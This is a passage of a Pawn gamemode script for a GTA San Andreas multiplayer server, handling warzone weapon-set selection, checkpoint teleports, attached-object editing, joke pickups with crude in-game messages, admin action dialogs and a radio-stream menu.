	  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
			TextDrawHideForPlayer(playerid, wzweaponsettd2);
			TextDrawHideForPlayer(playerid, wzweaponsettd3);
			TextDrawHideForPlayer(playerid, wzweaponsettd4);
			TextDrawHideForPlayer(playerid, wzweaponsettd5);
	    	CancelSelectTextDraw(playerid);
		    return 1;
		}

		ResetPlayerWeapons(playerid);
		player[playerid][playerwarzoneset] = 3;

  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
		TextDrawHideForPlayer(playerid, wzweaponsettd2);
		TextDrawHideForPlayer(playerid, wzweaponsettd3);
		TextDrawHideForPlayer(playerid, wzweaponsettd4);
		TextDrawHideForPlayer(playerid, wzweaponsettd5);
    	CancelSelectTextDraw(playerid);

		TextDrawShowForPlayer(playerid, wzhelptd1);
		TextDrawShowForPlayer(playerid, wzhelptd2);
		
		GetPlayerName(playerid, playername, sizeof(playername));
		if (player[playerid][playerwarzoneteam] == 1)
		{
			strings = "Attacker/Rifleman";
			stringe = "Attacker";
		} else {
			strings = "Defender/Rifleman";
			stringe = "Defender";
		}
		for (new acp = 0; acp < MAX_PLAYERS; acp++)
		{
			if (IsPlayerConnected(acp) && player[acp][playingwarzone] == 1)
			{
			    if (player[acp][playerwarzoneteam] == player[playerid][playerwarzoneteam]) SendPlayerMessageToPlayer(acp, playerid, strings);
				else SendPlayerMessageToPlayer(acp, playerid, stringe);
			}
		}
    } else if (clickedid == wzweaponsettd4)
    {
        if (player[playerid][playerwarzoneset] > 0)
		{
	  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
			TextDrawHideForPlayer(playerid, wzweaponsettd2);
			TextDrawHideForPlayer(playerid, wzweaponsettd3);
			TextDrawHideForPlayer(playerid, wzweaponsettd4);
			TextDrawHideForPlayer(playerid, wzweaponsettd5);
	    	CancelSelectTextDraw(playerid);
		    return 1;
		}

		ResetPlayerWeapons(playerid);
		player[playerid][playerwarzoneset] = 4;

  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
		TextDrawHideForPlayer(playerid, wzweaponsettd2);
		TextDrawHideForPlayer(playerid, wzweaponsettd3);
		TextDrawHideForPlayer(playerid, wzweaponsettd4);
		TextDrawHideForPlayer(playerid, wzweaponsettd5);
    	CancelSelectTextDraw(playerid);

		TextDrawShowForPlayer(playerid, wzhelptd1);
		TextDrawShowForPlayer(playerid, wzhelptd2);
		
		GetPlayerName(playerid, playername, sizeof(playername));
		if (player[playerid][playerwarzoneteam] == 1)
		{
			strings = "Attacker/Rifleman";
			stringe = "Attacker";
		} else {
			strings = "Defender/Rifleman";
			stringe = "Defender";
		}
		for (new acp = 0; acp < MAX_PLAYERS; acp++)
		{
			if (IsPlayerConnected(acp) && player[acp][playingwarzone] == 1)
			{
			    if (player[acp][playerwarzoneteam] == player[playerid][playerwarzoneteam]) SendPlayerMessageToPlayer(acp, playerid, strings);
				else SendPlayerMessageToPlayer(acp, playerid, stringe);
			}
		}
    } else if (clickedid == wzweaponsettd5)
    {
        if (player[playerid][playerwarzoneset] > 0)
		{
	  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
			TextDrawHideForPlayer(playerid, wzweaponsettd2);
			TextDrawHideForPlayer(playerid, wzweaponsettd3);
			TextDrawHideForPlayer(playerid, wzweaponsettd4);
			TextDrawHideForPlayer(playerid, wzweaponsettd5);
	    	CancelSelectTextDraw(playerid);
		    return 1;
		}

		ResetPlayerWeapons(playerid);
		player[playerid][playerwarzoneset] = 5;

  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
		TextDrawHideForPlayer(playerid, wzweaponsettd2);
		TextDrawHideForPlayer(playerid, wzweaponsettd3);
		TextDrawHideForPlayer(playerid, wzweaponsettd4);
		TextDrawHideForPlayer(playerid, wzweaponsettd5);
    	CancelSelectTextDraw(playerid);

		TextDrawShowForPlayer(playerid, wzhelptd1);
		TextDrawShowForPlayer(playerid, wzhelptd2);
		
		GetPlayerName(playerid, playername, sizeof(playername));
		if (player[playerid][playerwarzoneteam] == 1)
		{
			strings = "Attacker/Sniper";
			stringe = "Attacker";
		} else {
			strings = "Defender/Sniper";
			stringe = "Defender";
		}
		for (new acp = 0; acp < MAX_PLAYERS; acp++)
		{
			if (IsPlayerConnected(acp) && player[acp][playingwarzone] == 1)
			{
			    if (player[acp][playerwarzoneteam] == player[playerid][playerwarzoneteam]) SendPlayerMessageToPlayer(acp, playerid, strings);
				else SendPlayerMessageToPlayer(acp, playerid, stringe);
			}
		}
    } else { // in case of bugged
		TextDrawHideForPlayer(playerid, wzteamtd1);
		TextDrawHideForPlayer(playerid, wzteamtd2);
		TextDrawHideForPlayer(playerid, wzteamtd3);
  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
		TextDrawHideForPlayer(playerid, wzweaponsettd2);
		TextDrawHideForPlayer(playerid, wzweaponsettd3);
		TextDrawHideForPlayer(playerid, wzweaponsettd4);
		TextDrawHideForPlayer(playerid, wzweaponsettd5);
    }
    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
    return 0;
}

public OnPlayerEnterCheckpoint(playerid)
{
    //printf("\r\n[DEBUG-STUNTA] OnPlayerEnterCheckpoint(%d)", playerid);

	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	if (andromadacheckpoint == true && GetPlayerInterior(playerid) == 0)
	{
		SetPlayerPosEx(playerid, 1000.00, 1016.63, 997.59, 180.0, 1);
		player[playerid][InAndromada] = andromadavehicleid;
		SetPlayerRaceCheckpoint(playerid, 4, 1000.12, 1027.43, 993.70, 1000.00, 1017.45, 993.70, 3.0);
	}
	if (andromadacheckpoint == true && GetPlayerInterior(playerid) == 1)
	{
 		GetVehiclePos(player[playerid][InAndromada], playerxyza[0], playerxyza[1], playerxyza[2]);
		GetVehicleZAngle(player[playerid][InAndromada], playerxyza[3]);
		playerxyza[0] -= (30 * floatsin(-playerxyza[3], degrees));
		playerxyza[1] -= (30 * floatcos(-playerxyza[3], degrees));
		SetPlayerPosEx(playerid, playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3]+180, 0);

		GetVehiclePos(player[playerid][InAndromada], playerxyza[0], playerxyza[1], playerxyza[2]);
		GetVehicleZAngle(player[playerid][InAndromada], playerxyza[3]);
		playerxyza[0] -= (20 * floatsin(-playerxyza[3], degrees));
		playerxyza[1] -= (20 * floatcos(-playerxyza[3], degrees));
  		new Float:playerxyza2[3];
	    GetVehiclePos(andromadavehicleid, playerxyza2[0], playerxyza2[1], playerxyza2[2]);
 		SetPlayerRaceCheckpoint(playerid, 4, playerxyza[0], playerxyza[1], playerxyza[2]-1.5, playerxyza2[0], playerxyza2[1], playerxyza2[2]-1.5, 3.0);
 		player[playerid][InAndromada] = -1;
	}
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnRconCommand(cmd[])
{
	return 1;
}

//public OnDynamicObjectMoved(objectid)

public OnPlayerSelectDynamicObject(playerid, objectid, modelid, Float:x, Float:y, Float:z)
{
	return 1;
}

public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	if (response == EDIT_RESPONSE_FINAL)
	{
		for (new index = 0; index < VIP_MAX_OSTICKS; index++)
		{
			if (pSObject[playerid][index][so_object] == objectid)
			{
			    new vID = GetPlayerVehicleID(playerid);
				if (!vID)
				{
					GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
					//SetPlayerFacingAngle(playerid, 0.00);
				} else {
					GetVehiclePos(vID, playerxyza[0], playerxyza[1], playerxyza[2]);
					//SetVehicleZAngle(playerid, 0.00);
				}
			
				pSObject[playerid][index][so_x]		= playerxyza[0] - fX;
				pSObject[playerid][index][so_y]		= playerxyza[1] - fY;
				pSObject[playerid][index][so_z]		= playerxyza[2] - fZ;
				
				if (pSObject[playerid][index][so_isvehicle] == 0) AttachObjectToPlayer(pSObject[playerid][index][so_object], playerid, pSObject[playerid][index][so_x], pSObject[playerid][index][so_y], pSObject[playerid][index][so_z], pSObject[playerid][index][so_rx], pSObject[playerid][index][so_ry], pSObject[playerid][index][so_rz]);
				else AttachObjectToVehicle(pSObject[playerid][index][so_object], pSObject[playerid][index][so_isvehicle], pSObject[playerid][index][so_x], pSObject[playerid][index][so_y], pSObject[playerid][index][so_z], pSObject[playerid][index][so_rx], pSObject[playerid][index][so_ry], pSObject[playerid][index][so_rz]);
				break;
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "[INFO] Your attached object has been updated.");
		ShowPlayerStickyObjectsList(playerid);
    } else if (response == EDIT_RESPONSE_CANCEL) // cancelled - do not save
	{
		for (new index = 0; index < VIP_MAX_OSTICKS; index++)
		{
			if (pSObject[playerid][index][so_object] == objectid)
			{
				if (pSObject[playerid][index][so_isvehicle] == 0) AttachObjectToPlayer(pSObject[playerid][index][so_object], playerid, pSObject[playerid][index][so_x], pSObject[playerid][index][so_y], pSObject[playerid][index][so_z], pSObject[playerid][index][so_rx], pSObject[playerid][index][so_ry], pSObject[playerid][index][so_rz]);
				else AttachObjectToVehicle(pSObject[playerid][index][so_object], pSObject[playerid][index][so_isvehicle], pSObject[playerid][index][so_x], pSObject[playerid][index][so_y], pSObject[playerid][index][so_z], pSObject[playerid][index][so_rx], pSObject[playerid][index][so_ry], pSObject[playerid][index][so_rz]);
				break;
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "[INFO] Your attached object was not saved.");
		ShowPlayerStickyObjectsList(playerid);
	}
	return 1;
}

public OnPlayerSelectObject(playerid, type, objectid, modelid, Float:fX, Float:fY, Float:fZ)
{
	return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	if (response == EDIT_RESPONSE_FINAL)
    {
		if (IsPlayerAttachedObjectSlotUsed(playerid, index))
		{
			pAObject[playerid][index][ao_model]	= modelid;
			pAObject[playerid][index][ao_bone]	= boneid;
			pAObject[playerid][index][ao_x]		= fOffsetX;
			pAObject[playerid][index][ao_y]		= fOffsetY;
			pAObject[playerid][index][ao_z]		= fOffsetZ;
			pAObject[playerid][index][ao_rx]	= fRotX;
			pAObject[playerid][index][ao_ry]	= fRotY;
			pAObject[playerid][index][ao_rz]	= fRotZ;
			pAObject[playerid][index][ao_sx]	= fScaleX;
			pAObject[playerid][index][ao_sy]	= fScaleY;
			pAObject[playerid][index][ao_sz]	= fScaleZ;

			if (IsVIP(playerid))
			{
				if (fScaleX < 0 || fScaleX > VIP_MAX_SCALE || fScaleY < 0 || fScaleY > VIP_MAX_SCALE || fScaleZ < 0 || fScaleZ > VIP_MAX_SCALE)
				{
					SendClientMessage(playerid, COLOR_WHITE, "[INFO]: You have reached the scaling limit (min. 0.0 - max. 3.0). [Premium users: max. 10 objects, scale factor 100.0]");
					pAObject[playerid][index][ao_sx]	= 1.0;
					pAObject[playerid][index][ao_sy]	= 1.0;
					pAObject[playerid][index][ao_sz]	= 1.0;
				}
			} else {
				if (fScaleX < 0 || fScaleX > DEFAULT_MAX_SCALE || fScaleY < 0 || fScaleY > DEFAULT_MAX_SCALE || fScaleZ < 0 || fScaleZ > DEFAULT_MAX_SCALE)
				{
					SendClientMessage(playerid, COLOR_WHITE, "[INFO]: You have reached the scaling limit (min. 0.0 - max. 3.0). [Premium users: max. 10 objects, scale factor 100.0]");
					pAObject[playerid][index][ao_sx]	= 1.0;
					pAObject[playerid][index][ao_sy]	= 1.0;
					pAObject[playerid][index][ao_sz]	= 1.0;
				}
			}
			SetPlayerAttachedObject(playerid, index, pAObject[playerid][index][ao_model], pAObject[playerid][index][ao_bone], pAObject[playerid][index][ao_x], pAObject[playerid][index][ao_y], pAObject[playerid][index][ao_z], pAObject[playerid][index][ao_rx], pAObject[playerid][index][ao_ry], pAObject[playerid][index][ao_rz], pAObject[playerid][index][ao_sx], pAObject[playerid][index][ao_sy], pAObject[playerid][index][ao_sz]);
			SendClientMessage(playerid, COLOR_GREEN, "[INFO] Your attached object has been updated.");
			ShowPlayerAttachedObjectsList(playerid);
		}
    } else {
		// EDIT_RESPONSE_CANCEL - do not save
		
		if (IsPlayerAttachedObjectSlotUsed(playerid, index))
		{
			SetPlayerAttachedObject(playerid, index, pAObject[playerid][index][ao_model], pAObject[playerid][index][ao_bone], pAObject[playerid][index][ao_x], pAObject[playerid][index][ao_y], pAObject[playerid][index][ao_z], pAObject[playerid][index][ao_rx], pAObject[playerid][index][ao_ry], pAObject[playerid][index][ao_rz], pAObject[playerid][index][ao_sx], pAObject[playerid][index][ao_sy], pAObject[playerid][index][ao_sz]);
			SendClientMessage(playerid, COLOR_GREEN, "[INFO] Your attached object was not saved.");
			ShowPlayerAttachedObjectsList(playerid);
		}
	}
	return 1;
}

public OnObjectMoved(objectid)
{
	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
    //printf("\r\n[DEBUG-STUNTA] OnPlayerPickUpPickup(%d, %d)", playerid, pickupid);

	if (pickupid == spawnpickup1)
	{
		/*if (player[playerid][PMSGtextdraw] != -1)
		{
			TextDrawHideForPlayer(playerid, pmsg1[playerid]);
			player[playerid][PMSGtextdraw] = -1;
			return 1;
		}

		TextDrawSetString(pmsg1[playerid], "~r~COMMANDS (/help)~n~~n~~y~General:___~w~/gen <1-4>~n~~y~Vehicle:____~w~/veh <1-3>~n~~y~Miscel.:____~w~/misc <1-6>~n~~y~Anims:_____~w~/actions, /ahelp, /ahelp2~n~~y~Teleports:_~w~/teleports, /iteleports,~n~____________/telelist~n~~n~~b~IRC: "IRC_CHANNEL" (irc.gtanet.com)");
		TextDrawShowForPlayer(playerid, pmsg1[playerid]);
		player[playerid][PMSGtextdraw] = 1;*/
		switch(random(3))
		{
			case 0: SetPlayerChatBubble(playerid, "I'm sexy and I know it", COLOR_PINK, 100.0, 30000);
			case 1: SetPlayerChatBubble(playerid, "I like horses", COLOR_PINK, 100.0, 30000);
			case 2: SetPlayerChatBubble(playerid, "I WORSHIP MRPEPINO", COLOR_PINK, 100.0, 30000);
		}
		GameTextForPlayer(playerid, "spacemud is a hacker.", 5000, 6);
		RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1);
		RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-2);
    } else if (pickupid == spawnpickup2)
	{
	    // DEFAULT - RANDOM
		SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 18693, 2, -1.65, 0.0, 0.0, 0.0, 90.0);
		RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-2);
		/*switch(random(2))
		{
			case 0: SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 19027, 2, 0.1, 0.04, -0.004, 90, 90);
			case 1: SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 19012, 2, 0.1, 0.04, 0, 90, 90);
		}*/
	
	    // HALLOWEEN
		/*SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 1254, 2, 0.05, 0.05, 0, 0, 90.0);
		SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-2, 2590, 6, 0.1, 0.05, -0.9, 3.0, 178.0, 50.0);
		GivePlayerWeapon(playerid, 15, 1);*/

		// CHRISTMAS
		//SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 19065, 2, 0.14, 0.013, 0.0, 30.0, 100.0, 60.0);
    } else if (pickupid == spawnpickup3)
	{
		SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 19027, 2, 0.1, 0.04, -0.004, 90.0, 90.0);
		SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-2, 18912, 2, 0.07, 0.025, 0.0, -90.0, 0.0, -90.0);
		
	    // DEFAULT
		//RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1);
	
	    // HALLOWEEN
		/*RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1);
		RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-2);*/

		// CHRISTMAS
		//RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1);
    } else if (pickupid == spawnpickup4)
	{
		SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 1485, 2, -0.01, 0.04, -0.06, 0.0, 90.0, 125);
		RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-2);
	} else if (pickupid == spawnpickup5)
	{
	    //SendPlayerMessageToPlayer(playerid, playerid, "I'm gay for xMovie");
	    //SetPlayerHealth(playerid, 0.00);
       	ApplyAnimation(playerid, "PED", "HIT_walk", 4.1, 1, 1, 1, 1, 1, 1);
	} else if (pickupid == poo)
    {
    	ApplyAnimation(playerid, "PED", "HIT_walk", 4.1, 1, 1, 1, 1, 1, 1);
    	DestroyPickup(poo);
        poo = -1;
        GetPlayerName(playerid, playername, sizeof(playername));
        format(strings, sizeof(strings), "%s found %s's {9b6b2b}poo {65dbc6}and was given magic powers :O!", playername, playerpoo);
        SendServerMessageToAll("{65dbc6}", strings);
		format(ircstring, sizeof(ircstring), "10%s found %s's 5poo10 and was given magic powers :O!", playername, playerpoo);
		IRC_GroupSay(1, IRC_CHANNEL, ircstring);
    } else if (pickupid == pill)
    {
		switch(random(2))
		{
			case 0: ApplyAnimation(playerid, "PED", "FLOOR_hit", 4.1,1, 1, 1, 1, 1, 1);
			case 1: ApplyAnimation(playerid, "PED", "FLOOR_hit_f", 4.1, 1, 1, 1, 1, 1, 1);
		}
    	DestroyPickup(pill);
        pill = -1;
        GetPlayerName(playerid, playername, sizeof(playername));
        format(strings, sizeof(strings), "%s has found %s's {E81CC9}illegal drugs {65dbc6}that came from his butthole and was given magic powers :O!", playername, playerpill);
        SendServerMessageToAll("{65dbc6}", strings);
		format(ircstring, sizeof(ircstring), "10%s has found %s's 4illegal drugs10 that came from his butthole and was given magic powers :O!", playername, playerpill);
		IRC_GroupSay(1, IRC_CHANNEL, ircstring);
    }
	return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	player[playerid][clickedplayer] = clickedplayerid;
	switch(player[playerid][ADMIN])
	{
	    case 0:
	    {
			ShowPlayerDialog(playerid, DIALOGID_ACTION, DIALOG_STYLE_LIST, "Actions List", "PM", "OK", "Cancel");
	    }
	    case 1:
	    {
			ShowPlayerDialog(playerid, DIALOGID_ACTION, DIALOG_STYLE_LIST, "Actions List", "PM", "OK", "Cancel");
	    }
	    case 2:
	    {
			ShowPlayerDialog(playerid, DIALOGID_ACTION, DIALOG_STYLE_LIST, "Actions List", "PM\nKick", "OK", "Cancel");
	    }
	    case 3:
	    {
			ShowPlayerDialog(playerid, DIALOGID_ACTION, DIALOG_STYLE_LIST, "Actions List", "PM\nKick\nBan", "OK", "Cancel");
	    }
	    case 4:
	    {
			ShowPlayerDialog(playerid, DIALOGID_ACTION, DIALOG_STYLE_LIST, "Actions List", "PM\nKick\nBan\nForcecolour", "OK", "Cancel");
	    }
	    case 5,6:
	    {
			ShowPlayerDialog(playerid, DIALOGID_ACTION, DIALOG_STYLE_LIST, "Actions List", "PM\nKick\nBan\nForcecolour", "OK", "Cancel");
	    }
	    
	}
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if (dialogid == DIALOGID_UNKNOWN)
	return 0;

    switch(dialogid)
    {
    	case DIALOGID_SPAWN:
        {
         	SetPlayerVirtualWorld(playerid, WORLDID_DEFAULT);
	        if (response)
	        {
	            if (player[playerid][firstspawn] == 1)
	            {
					new Rand = random(sizeof(MSpawnPos));
				 	SetPlayerPos(playerid, MSpawnPos[Rand][0], MSpawnPos[Rand][1], MSpawnPos[Rand][2]);
					SetPlayerFacingAngle(playerid, MSpawnPos[Rand][3]);
				 	SetPlayerInterior(playerid, 0);
					SetCameraBehindPlayer(playerid);
				}
		 		player[playerid][pspawnid] = 0;
	        } else {
	            if (player[playerid][firstspawn] == 1)
	            {
					new Rand = random(sizeof(M2SpawnPos));
				 	SetPlayerPos(playerid, M2SpawnPos[Rand][0], M2SpawnPos[Rand][1], M2SpawnPos[Rand][2]);
					SetPlayerFacingAngle(playerid, M2SpawnPos[Rand][3]);
				 	SetPlayerInterior(playerid, 0);
					SetCameraBehindPlayer(playerid);
				}
		 		player[playerid][pspawnid] = 1;
	        }
       		if (player[playerid][firstspawn] == 1)
			player[playerid][firstspawn] = 0;
       		return 1;
		}

        case DIALOGID_ACTION:
        {
	        if (response)
	        {
	        	switch(listitem)
				{
					case 0: return ShowPlayerDialog(playerid, DIALOGID_SENDPM, DIALOG_STYLE_INPUT, "Private Message", "Enter the message you would like to send:", "Send", "Cancel");
					case 1: return ShowPlayerDialog(playerid, DIALOGID_KICK, DIALOG_STYLE_INPUT, "Kick", "Reason:", "Kick", "Cancel");
					case 2: return ShowPlayerDialog(playerid, DIALOGID_BAN, DIALOG_STYLE_INPUT, "Ban", "Reason:", "Ban", "Cancel");
					case 3:
					{
						new colorStr[1052];

						colorStr =			""EMBED_WHITE"Random\n\
											WHITE\n\
											WHITE (Invisible)\n\
											"EMBED_GREEN"GREEN\n\
											"EMBED_RED"RED\n\
											"EMBED_BLUE"BLUE\n\
											"EMBED_PINK"PINK\n\
											"EMBED_PURPLE"PURPLE\n\
											"EMBED_YELLOW"YELLOW\n\
											"EMBED_BROWN"BROWN\n\
											"EMBED_GREY"GREY\n\
											"EMBED_GREY"BLACK\n\
											"EMBED_LPINK"LPINK\n\
											"EMBED_ORANGE"ORANGE\n\
											"EMBED_PINKRED"PINKRED\n\
											"EMBED_DARKRED"DARKRED\n\
											"EMBED_DARKERRED"DARKERRED\n\
											"EMBED_ORANGERED"ORANGERED\n\
											"EMBED_TOMATO"TOMATO\n\
											"EMBED_LIGHTBLUE"LIGHTBLUE\n\
											"EMBED_LIGHTNAVY"LIGHTNAVY\n";

						strcat(colorStr, 	""EMBED_NAVYBLUE"NAVYBLUE\n\
											"EMBED_LBLUE"LBLUE\n\
											"EMBED_LLBLUE"LLBLUE\n\
											"EMBED_FLBLUE"FLBLUE\n\
											"EMBED_BLUEVIOLET"BLUEVIOLET\n\
											"EMBED_BISQUE"BISQUE\n\
											"EMBED_LIME"LIME\n\
											"EMBED_LAWNGREEN"LAWNGREEN\n\
											"EMBED_SEAGREEN"SEAGREEN\n\
											"EMBED_LIMEGREEN"LIMEGREEN\n\
											"EMBED_SPRINGGREEN"SPRINGGREEN\n\
											"EMBED_YELLOWGREEN"YELLOWGREEN\n\
											"EMBED_GREENYELLOW"GREENYELLOW\n\
											"EMBED_OLIVE"OLIVE\n\
											"EMBED_AQUA"AQUA\n\
											"EMBED_MEDIUMAQUA"MEDIUMAQUA\n\
											"EMBED_MAGENTA"MAGENTA\n");

						strcat(colorStr, 	""EMBED_MEDIUMMAGENTA"MEDIUMMAGENTA\n\
											"EMBED_CHARTREUSE"CHARTREUSE\n\
											"EMBED_CORAL"CORAL\n\
											"EMBED_GOLD"GOLD\n\
											"EMBED_INDIGO"INDIGO\n\
											"EMBED_IVORY"IVORY");

						return ShowPlayerDialog(playerid, DIALOGID_FORCECOLOUR, DIALOG_STYLE_LIST, "Available colours", colorStr, "Set", "Cancel");
					}
				}
	        } else {
				player[playerid][clickedplayer] = -1;
				return 0;
			}
		}

        case DIALOGID_RADIO:
        {
	        if (response)
	        {
	        	switch(listitem)
				{
					case 0:
					{
						new radiolist[450];
						radiolist = ".977 Today's Hits\n.977 Hip Hop/RNB\n.977 Alternative\n.977 90's Hits\n.977 80's Hits\n.977 70's Rock\n.977 Oldies\n.977 Country\n.977 Adult Hits\n.977 Jazz Music\n.977 Comedy\nThe Doo-Wop Express\nHARDSTATION.fm\nFEAR.fm\nHARD.fm\nSKY.fm Top Hits\nSKY.fm Dance Hits\nSKY.fm Urban Jamz\nSKY.fm Classic Rap\nSKY.fm 80's Hits\nSKY.fm 70's Hits\nSKY.fm Oldies\nSKY.fm Reggae\nSKY.fm Classic Rock\nSKY.fm Salsa\nSKY.fm Pop Punk\nSKY.fm Love Music";
						ShowPlayerDialog(playerid, DIALOGID_RADIOLIST, DIALOG_STYLE_LIST, "Radio Control Panel [Radio List]", radiolist, "OK", "Return");
					}
					case 1:
					{
						ShowPlayerDialog(playerid, DIALOGID_RADIOCUSTOM, DIALOG_STYLE_INPUT, "Radio Control Panel [Custom Radio]", "Radio extensions: .ASX, .PLS\n\n(Single audio files:\nWAV, AIFF, MP3/MP2/MP1, OGG,\nWMA, FLAC, WV, SPX, MPC, AC3,\nAAC, ALAC, TTA, APE and OFR)", "Play", "Close");
					}
					case 2:
					{
						StopAudioStreamForPlayer(playerid);
					}
					case 3:
					{
						if (player[playerid][radio] == 1)
						return ShowPlayerDialog(playerid, DIALOGID_RADIO, DIALOG_STYLE_MSGBOX, "Radio Control Panel [Connect]", "ERROR: xAudio is already enabled.", "Close", "");

						player[playerid][radio] = 1;
					}
					case 4:
					{
						if (player[playerid][radio] == 0)
						return ShowPlayerDialog(playerid, DIALOGID_RADIO, DIALOG_STYLE_MSGBOX, "Radio Control Panel [Disconnect]", "ERROR: xAudio is already enabled.", "Close", "");

						player[playerid][radio] = 0;
					}
				}
				return 1;
	        }
			return 0;
		}
        case DIALOGID_RADIOLIST:
        {
	        if (response)
	        {
				SendClientMessage(playerid, COLOR_ORANGE, "Radio is buffering, please hold a few seconds.");

	     	    GetPlayerName(playerid, playername, sizeof(playername));
				format(logstring, sizeof(logstring), "%s (%d) streaming.", playername, playerid);
				printflog("RADIO", logstring);

	            new radiostr[95];
	        	switch(listitem)
				{
					case 0: radiostr = "http://www.977music.com/tunein/web/hitz3.asx";
					case 1: radiostr = "http://www.977music.com/tunein/web/jamz3.asx";
					case 2: radiostr = "http://www.977music.com/tunein/web/alternative3.asx";
					case 3: radiostr = "http://www.977music.com/tunein/web/90s3.asx";
					case 4: radiostr = "http://www.977music.com/tunein/web/80s3.asx";
					case 5: radiostr = "http://www.977music.com/tunein/web/classicrock3.asx";
					case 6: radiostr = "http://www.977music.com/tunein/web/oldies3.asx";
					case 7: radiostr = "http://www.977music.com/tunein/web/country3.asx";
					case 8: radiostr = "http://www.977music.com/tunein/web/mix3.asx";
					case 9: radiostr = "http://www.977music.com/tunein/web/smoothjazz3.asx";
					case 10: radiostr = "http://www.977music.com/tunein/web/comedy3.asx";
					case 11: radiostr = "http://loudcity.com/player/the-doo-wop-express/asx.asx?cache_bust=1319842983&max_bitrate=56";
					case 12: radiostr = "http://www.hardstation.fm/content/streamfiles/listen.asx";
					case 13: radiostr = "http://www.fear.fm/streamrelay/playlist/harder.asx";
					case 14: radiostr = "http://files.hard.fm/listen.asx";
					case 15: radiostr = "http://listen.sky.fm/public5/tophits.asx";
					case 16: radiostr = "http://listen.sky.fm/public5/dancehits.asx";
					case 17: radiostr = "http://listen.sky.fm/public5/urbanjamz.asx";
					case 18: radiostr = "http://listen.sky.fm/public5/classicrap.asx";
					case 19: radiostr = "http://listen.sky.fm/public5/the80s.asx";
					case 20: radiostr = "http://listen.sky.fm/public5/hit70s.asx";
					case 21: radiostr = "http://listen.sky.fm/public5/oldies.asx";
					case 22: radiostr = "http://listen.sky.fm/public5/rootsreggae.asx";
					case 23: radiostr = "http://listen.sky.fm/public5/classicrock.asx";
					case 24: radiostr = "http://listen.sky.fm/public5/salsa.asx";
					case 25: radiostr = "http://listen.sky.fm/public5/poppunk.asx";
					case 26: radiostr = "http://listen.sky.fm/public5/lovemusic.asx";
				}
				PlayAudioStreamForPlayer(playerid, radiostr);
				new radiolist[450];
				radiolist = ".977 Today's Hits\n.977 Hip Hop/RNB\n.977 Alternative\n.977 90's Hits\n.977 80's Hits\n.977 70's Rock\n.977 Oldies\n.977 Country\n.977 Adult Hits\n.977 Jazz Music\n.977 Comedy\nThe Doo-Wop Express\nHARDSTATION.fm\nFEAR.fm\nHARD.fm\nSKY.fm Top Hits\nSKY.fm Dance Hits\nSKY.fm Urban Jamz\nSKY.fm Classic Rap\nSKY.fm 80's Hits\nSKY.fm 70's Hits\nSKY.fm Oldies\nSKY.fm Reggae\nSKY.fm Classic Rock\nSKY.fm Salsa\nSKY.fm Pop Punk\nSKY.fm Love Music";
				ShowPlayerDialog(playerid, DIALOGID_RADIOLIST, DIALOG_STYLE_LIST, "Radio Control Panel [Radio List]", radiolist, "OK", "Return");
	        } else ShowPlayerDialog(playerid, DIALOGID_RADIO, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nStop Radio\nEnable xAudio\nDisable xAudio", "OK", "Close");
			return 1;
		}
        case DIALOGID_RADIOCUSTOM:
        {
	        if (response)
	        {
				if (!strlen(inputtext))
    			return ShowPlayerDialog(playerid, DIALOGID_RADIOCUSTOM, DIALOG_STYLE_INPUT, "Radio Control Panel [Custom Radio]", "ERROR: Invalid file extension.\n\nRadio extensions: .ASX, .PLS\n\n(Single audio files:\nWAV, AIFF, MP3/MP2/MP1, OGG,\nWMA, FLAC, WV, SPX, MPC, AC3,\nAAC, ALAC, TTA, APE and OFR)", "Stream", "Close");

	       	    for (new i = 0; i < 19; i++)
			    {
					if (strfind(inputtext, AudioFiles[i], true) != -1)
					{
						SendClientMessage(playerid, COLOR_ORANGE, "Radio is buffering, please hold a few seconds.");

					    GetPlayerName(playerid, playername, sizeof(playername));
						format(logstring, sizeof(logstring), "%s (%d) stream: %s", playername, playerid, inputtext);
						printflog("RADIO-C", logstring);

						PlayAudioStreamForPlayer(playerid, inputtext);
